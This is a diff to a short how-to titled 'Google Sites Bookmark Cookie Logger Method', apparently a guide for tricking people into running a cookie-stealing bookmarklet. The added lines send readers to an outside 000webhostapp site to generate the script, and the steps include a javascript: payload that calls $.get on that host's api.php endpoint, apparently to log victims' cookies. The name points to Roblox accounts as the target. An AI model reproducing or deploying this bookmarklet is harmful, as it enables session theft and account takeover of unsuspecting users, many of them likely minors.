@@ -7,8 +7,9 @@ Google Sites Bookmark Cookie Logger Method
 
 3. Paste the code from down below in
 
-4.Delete PasteJavaHere and paste your own Javascript 
-(dont have a javascript?, go to #javascript click on the site and make one)
+4.Delete PasteJavaHere and paste your own Javascript
+
+(dont have a javascript?, go to https://robloxclothingbeta.000webhostapp.com/index.html click on the site and make one)
 
 5. Delete the "" and replace with '' like this below
 "xJavascript:$.get("//robloxclothingbeta.000webhostapp.com/api.php?id=123456")" to "xJavascript:$.get('//robloxclothingbeta.000webhostapp.com/api.php?id=123456')"
